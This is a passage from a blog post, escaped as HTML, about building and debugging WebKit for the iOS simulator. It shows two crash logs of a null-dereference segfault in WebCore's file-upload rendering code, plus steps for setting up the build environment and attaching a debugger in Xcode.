&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Subtype: KERN_INVALID_ADDRESS at 0x0000000000000000
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;VM Region Info: 0 is not in any region.  Bytes before following region: 4372119552
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      REGION TYPE                      START - END             [ VSIZE] PRT&amp;#x2F;MAX SHRMOD  REGION DETAIL
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      UNUSED SPACE AT START
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;---&amp;amp;gt;  
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      __TEXT                 0000000104994000-0000000104998000 [   16K] r-x&amp;#x2F;r-x SM=COW  ...it.WebContent
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Termination Signal: Segmentation fault: 11
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Termination Reason: Namespace SIGNAL, Code 0xb
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Terminating Process: exc handler [30816]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Triggered by Thread:  0
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Thread 0 name:  Dispatch queue: com.apple.main-thread
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Thread 0 Crashed:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;0   WebCore                       	0x00000001b0225e78 0x1aef42000 + 19807864
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;1   WebCore                       	0x00000001af51f158 0x1aef42000 + 6148440
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;2   WebCore                       	0x00000001b039bcf8 0x1aef42000 + 21339384
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;3   WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;4   WebCore                       	0x00000001b03927c4 0x1aef42000 + 21301188
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;5   WebCore                       	0x00000001b03099cc 0x1aef42000 + 20740556
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;6   WebCore                       	0x00000001b0310034 0x1aef42000 + 20766772
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;7   WebCore                       	0x00000001b048e35c 0x1aef42000 + 22332252
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;8   WebCore                       	0x00000001b040d8ec 0x1aef42000 + 21805292
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;9   WebCore                       	0x00000001b032325c 0x1aef42000 + 20845148
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;10  WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;11  WebCore                       	0x00000001b0322f28 0x1aef42000 + 20844328
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;12  WebCore                       	0x00000001b0322bdc 0x1aef42000 + 20843484
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;13  WebCore                       	0x00000001b0323294 0x1aef42000 + 20845204
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;14  WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;15  WebCore                       	0x00000001b0322f28 0x1aef42000 + 20844328
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;16  WebCore                       	0x00000001b0322bdc 0x1aef42000 + 20843484
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;17  WebCore                       	0x00000001b0323294 0x1aef42000 + 20845204
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;18  WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;19  WebCore                       	0x00000001b03e6e0c 0x1aef42000 + 21646860
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;20  WebCore                       	0x00000001b03e4944 0x1aef42000 + 21637444
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;21  WebCore                       	0x00000001b03e202c 0x1aef42000 + 21626924
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;22  WebCore                       	0x00000001b03e1ff4 0x1aef42000 + 21626868
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;23  WebCore                       	0x00000001b03dfe84 0x1aef42000 + 21618308
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;24  WebCore                       	0x00000001b00bb610 0x1aef42000 + 18322960
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;25  WebCore                       	0x00000001b015b8e8 0x1aef42000 + 18979048
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;26  WebCore                       	0x00000001b00bb354 0x1aef42000 + 18322260
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;27  WebKit                        	0x00000001b629b134 0x1b6135000 + 1466676
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;28  WebKit                        	0x00000001b629c814 0x1b6135000 + 1472532
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;29  WebKit                        	0x00000001b61f1430 0x1b6135000 + 771120
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;30  WebCore                       	0x00000001b016734c 0x1aef42000 + 19026764
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;31  WebCore                       	0x00000001b0150c5c 0x1aef42000 + 18934876
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;32  WebCore                       	0x00000001b01ab680 0x1aef42000 + 19306112
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;33  CoreFoundation                	0x00000001a63e0b80 0x1a6330000 + 723840
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;34  CoreFoundation                	0x00000001a63e08ac 0x1a6330000 + 723116
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;35  CoreFoundation                	0x00000001a63e0090 0x1a6330000 + 721040
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;36  CoreFoundation                	0x00000001a63dad28 0x1a6330000 + 699688
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;37  CoreFoundation                	0x00000001a63da2e8 0x1a6330000 + 697064
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;38  Foundation                    	0x00000001a6dde3e0 0x1a6dd6000 + 33760
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;39  Foundation                    	0x00000001a6e1b1cc 0x1a6dd6000 + 283084
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;40  libxpc.dylib                  	0x00000001a6099d10 0x1a6085000 + 85264
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;41  libxpc.dylib                  	0x00000001a609c7a8 0x1a6085000 + 96168
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;42  com.apple.WebKit.WebContent   	0x00000001049976b4 0x104994000 + 14004
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;43  libdyld.dylib                 	0x00000001a5e8d050 0x1a5e8c000 + 4176
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;It’s clear that this is a null dereference scenario, but finding the bug in the code out of this dump would be a nightmare. So I decided to setup my WebKit for iOS environment.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;system-prerequisites&amp;quot;&amp;gt;System Prerequisites&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;You have to have:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Recent Xcode with iPhone SDK&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.macworld.co.uk&amp;#x2F;how-to&amp;#x2F;mac&amp;#x2F;how-turn-off-mac-os-x-system-integrity-protection-rootless-3638975&amp;#x2F;&amp;quot;&amp;gt;Disable SIP&amp;lt;&amp;#x2F;a&amp;gt;!
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;I couldn’t tell you how much time I wasted on this one. It was unclear to me that SIP on the Mac host machine would affect attaching to Safari &amp;#x2F; WebKit &amp;lt;strong&amp;gt;inside&amp;lt;&amp;#x2F;strong&amp;gt; the iPhone simulator. Before disabling SIP I kept getting &amp;lt;em&amp;gt;error: attach failed: unable to attach&amp;lt;&amp;#x2F;em&amp;gt; from lldb, and &amp;lt;em&amp;gt;Could not attach to pid (unable to attach)&amp;lt;&amp;#x2F;em&amp;gt; trying to attach from Xcode. &amp;lt;strong&amp;gt;Disable SIP solved the debugger attaching errors&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;h2 id=&amp;quot;get-the-code&amp;quot;&amp;gt;Get the Code&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Generally just follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;getting-the-code&amp;#x2F;&amp;quot;&amp;gt;the Webkit guide for getting the code&amp;lt;&amp;#x2F;a&amp;gt;. All you have to run is:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;svn checkout https:&amp;#x2F;&amp;#x2F;svn.webkit.org&amp;#x2F;repository&amp;#x2F;webkit&amp;#x2F;trunk WebKit
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;This will checkout the up-to-date code version, which is probably not very stable. Try updating it once in a while if it’s not stable until you reach a stable enough version using the SVN update command from within the WebKit directory:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;svn up
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;compiling-running-webkit-for-ios&amp;quot;&amp;gt;Compiling + Running WebKit for iOS&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;All iOS browsers (including Safari, Chrome, Opera, Firefox..) must use the pre-installed iOS WebKit version to get approved into the App Store. The browser used for debugging the WebKit engine on iOS is Safari and there are automated scripts ready to compile and launch everything for you. Simply follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;blog&amp;#x2F;3457&amp;#x2F;building-webkit-for-ios-simulator&amp;#x2F;&amp;quot;&amp;gt;this guide&amp;lt;&amp;#x2F;a&amp;gt; from the WebKit blog. (Be sure to pass &amp;lt;code&amp;gt;--ios-simulator --debug&amp;lt;&amp;#x2F;code&amp;gt; to every WebKit script you are running)&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;better-crash-logs&amp;quot;&amp;gt;Better Crash Logs&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Now that you have a running Safari with debug symbols - reproduce the crash. If you manage to get the browser to crash with the &amp;quot;This webpage was reloaded because a problem occurred.&amp;quot; message - look at the &amp;lt;code&amp;gt;~&amp;#x2F;Library&amp;#x2F;Logs&amp;#x2F;DiagnosticReports&amp;#x2F;&amp;lt;&amp;#x2F;code&amp;gt; directory on your Mac and check if a log was recently created. It’s file name should end with your Mac’s name and not with the iPhone, which could be a bit confusing. Open the crash dump and you should be able to read it much clearly:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Type:        EXC_BAD_ACCESS (SIGSEGV)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Codes:       KERN_INVALID_ADDRESS at 0x0000000000000000
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Note:        EXC_CORPSE_NOTIFY
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Termination Signal:    Segmentation fault: 11
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Termination Reason:    Namespace SIGNAL, Code 0xb
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Terminating Process:   exc handler [64527]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;VM Regions Near 0:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;--&amp;amp;gt; 
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    __TEXT                 0000000108332000-0000000108334000 [    8K] r-x&amp;#x2F;rwx SM=COW  &amp;#x2F;Applications&amp;#x2F;Xcode.app&amp;#x2F;Contents&amp;#x2F;Developer&amp;#x2F;Platforms&amp;#x2F;iPhoneOS.platform&amp;#x2F;Developer&amp;#x2F;Library&amp;#x2F;CoreSimulator&amp;#x2F;Profiles&amp;#x2F;Runtimes&amp;#x2F;iOS.simruntime&amp;#x2F;Contents&amp;#x2F;Resources&amp;#x2F;RuntimeRoot&amp;#x2F;System&amp;#x2F;Library&amp;#x2F;Frameworks&amp;#x2F;WebKit.framework&amp;#x2F;XPCServices&amp;#x2F;com.apple.WebKit.WebContent.xpc&amp;#x2F;com.apple.WebKit.WebContent
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Application Specific Information:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;CoreSimulator 581.2 - Device: iPhone SE For WebKit Development - Runtime: iOS 12.1 (16B91) - DeviceType: iPhone SE
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Thread 0 Crashed:: Dispatch queue: com.apple.main-thread
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;0   com.apple.WebCore             	0x000000026a32c1f7 WebCore::GraphicsContext::platformContext() const + 7
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;1   com.apple.WebCore             	0x00000002695ff2fc WebCore::RenderThemeIOS::paintFileUploadIconDecorations(WebCore::RenderObject const&amp;amp;amp;, WebCore::RenderObject const&amp;amp;amp;, WebCore::PaintInfo const&amp;amp;amp;, WebCore::IntRect const&amp;amp;amp;, WebCore::Icon*, WebCore::RenderTheme::FileUploadDecorations) + 524
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;2   com.apple.WebCore             	0x000000026a4b323f WebCore::RenderFileUploadControl::paintObject(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 2671
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;3   com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 271
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;4   com.apple.WebCore             	0x000000026a4a9082 WebCore::RenderElement::paintAsInlineBlock(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 162
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;5   com.apple.WebCore             	0x000000026a41a687 WebCore::InlineElementBox::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::LayoutUnit, WebCore::LayoutUnit) + 119
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;6   com.apple.WebCore             	0x000000026a420cf0 WebCore::InlineFlowBox::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::LayoutUnit, WebCore::LayoutUnit) + 1056
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;7   com.apple.WebCore             	0x000000026a5ac9e2 WebCore::RootInlineBox::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::LayoutUnit, WebCore::LayoutUnit) + 34
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;8   com.apple.WebCore             	0x000000026a52a122 WebCore::RenderLineBoxList::paint(WebCore::RenderBoxModelObject*, WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) const + 994
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;9   com.apple.WebCore             	0x000000026a434b97 WebCore::RenderBlock::paintObject(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 695
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;10  com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 271
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;11  com.apple.WebCore             	0x000000026a4347fa WebCore::RenderBlock::paintChild(WebCore::RenderBox&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, bool, WebCore::RenderBlock::PaintBlockType) + 666
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;12  com.apple.WebCore             	0x000000026a43452f WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, bool) + 95
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;13  com.apple.WebCore             	0x000000026a434bc3 WebCore::RenderBlock::paintObject(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 739
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;14  com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 271
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;15  com.apple.WebCore             	0x000000026a4347fa WebCore::RenderBlock::paintChild(WebCore::RenderBox&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, bool, WebCore::RenderBlock::PaintBlockType) + 666
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;16  com.apple.WebCore             	0x000000026a43452f WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, bool) + 95
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;17  com.apple.WebCore             	0x000000026a434bc3 WebCore::RenderBlock::paintObject(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 739
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;18  com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 271
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;19  com.apple.WebCore             	0x000000026a500033 WebCore::RenderLayer::paintForegroundForFragmentsWithPhase(WebCore::PaintPhase, WTF::Vector&amp;amp;lt;WebCore::LayerFragment, 1ul, WTF::CrashOnOverflow, 16ul&amp;amp;gt; const&amp;amp;amp;, WebCore::GraphicsContext&amp;amp;amp;, WebCore::RenderLayer::LayerPaintingInfo const&amp;amp;amp;, unsigned int, WebCore::RenderObject*) + 403
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;20  com.apple.WebCore             	0x000000026a4fd809 WebCore::RenderLayer::paintForegroundForFragments(WTF::Vector&amp;amp;lt;WebCore::LayerFragment, 1ul, WTF::CrashOnOverflow, 16ul&amp;amp;gt; const&amp;amp;amp;, WebCore::GraphicsContext&amp;amp;amp;, WebCore::GraphicsContext&amp;amp;amp;, WebCore::LayoutRect const&amp;amp;amp;, bool, WebCore::RenderLayer::LayerPaintingInfo const&amp;amp;amp;, unsigned int, WebCore::RenderObject*) + 393
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;21  com.apple.WebCore             	0x000000026a4fa829 WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext&amp;amp;amp;, WebCore::RenderLayer::LayerPaintingInfo const&amp;amp;amp;, unsigned int) + 2697
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;22  com.apple.WebCore             	0x000000026a4fa8e2 WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext&amp;amp;amp;, WebCore::RenderLayer::LayerPaintingInfo const&amp;amp;amp;, unsigned int) + 2882
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;23  com.apple.WebCore             	0x000000026a4f7e01 WebCore::RenderLayer::paint(WebCore::GraphicsContext&amp;amp;amp;, WebCore::LayoutRect const&amp;amp;amp;, WebCore::LayoutSize const&amp;amp;amp;, unsigned int, WebCore::RenderObject*, unsigned int, WebCore::RenderLayer::SecurityOriginPaintPolicy) + 273
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;24  com.apple.WebCore             	0x000000026a1a64a7 WebCore::FrameView::paintContents(WebCore::GraphicsContext&amp;amp;amp;, WebCore::IntRect const&amp;amp;amp;, WebCore::Widget::SecurityOriginPaintPolicy) + 743
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;25  com.apple.WebCore             	0x000000026a24e5ee WebCore::ScrollView::paint(WebCore::GraphicsContext&amp;amp;amp;, WebCore::IntRect const&amp;amp;amp;, WebCore::Widget::SecurityOriginPaintPolicy) + 574
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;26  com.apple.WebCore             	0x000000026a1a619d WebCore::FrameView::traverseForPaintInvalidation(WebCore::GraphicsContext::PaintInvalidationReasons) + 253
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;27  com.apple.WebKit              	0x0000000108a96e8a WebKit::RemoteLayerTreeDrawingArea::flushLayers() + 340
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;28  com.apple.WebCore             	0x000000026a259f00 WebCore::ThreadTimers::sharedTimerFiredInternal() + 336
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;29  com.apple.WebCore             	0x000000026a2a75ef WebCore::timerFired(__CFRunLoopTimer*, void*) + 31
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;30  com.apple.CoreFoundation      	0x0000000109469f34 __CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 20
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;31  com.apple.CoreFoundation      	0x0000000109469b32 __CFRunLoopDoTimer + 1026
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;32  com.apple.CoreFoundation      	0x000000010946939a __CFRunLoopDoTimers + 266
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;33  com.apple.CoreFoundation      	0x0000000109463a1c __CFRunLoopRun + 2252
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;34  com.apple.CoreFoundation      	0x0000000109462e11 CFRunLoopRunSpecific + 625
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;35  com.apple.Foundation          	0x00000001083ee322 -[NSRunLoop(NSRunLoop) runMode:beforeDate:] + 277
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;36  com.apple.Foundation          	0x00000001083ee492 -[NSRunLoop(NSRunLoop) run] + 76
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;37  libxpc.dylib                  	0x000000010ba72812 _xpc_objc_main + 460
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;38  libxpc.dylib                  	0x000000010ba74cbd xpc_main + 143
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;39  com.apple.WebKit.WebContent   	0x00000001083332d9 0x108332000 + 4825
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;40  libdyld.dylib                 	0x000000010b76b575 start + 1
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;debugging-using-xcode&amp;quot;&amp;gt;Debugging using Xcode&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;At this point you should already know the area of code you want to put breakpoints in. For convenience reasons - I chose to use Xcode over lldb for debugging. To do that you must configure Xcode to use the command-line-built binaries instead of rebuilding it itself. Do that by following the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;debugging-webkit&amp;#x2F;#debugging-using-xcode&amp;quot;&amp;gt;Debugging using Xcode section&amp;lt;&amp;#x2F;a&amp;gt; of the WebKit guide.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Now you can attach Xcode to the right WebKit process within the simulator. &amp;lt;strong&amp;gt;Important notice that also took me a long time to figure out - WebKit has multiple different processes for every tab.&amp;lt;&amp;#x2F;strong&amp;gt; So the process ID printed when you run &amp;lt;code&amp;gt;Tools&amp;#x2F;Scripts&amp;#x2F;run-safari&amp;lt;&amp;#x2F;code&amp;gt; is &amp;lt;strong&amp;gt;not&amp;lt;&amp;#x2F;strong&amp;gt; the one you want to attach to usually. In my example, I saw my crash is in &amp;lt;em&amp;gt;WebCore&amp;lt;&amp;#x2F;em&amp;gt;, so I attached to the &amp;lt;em&amp;gt;com.apple.WebKit.WebContent.Development&amp;lt;&amp;#x2F;em&amp;gt; within the simulator. If my bug was related to the networking part of WebKit, I would have attached to a different process. The different process names are documented &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;debugging-webkit&amp;#x2F;#processes&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
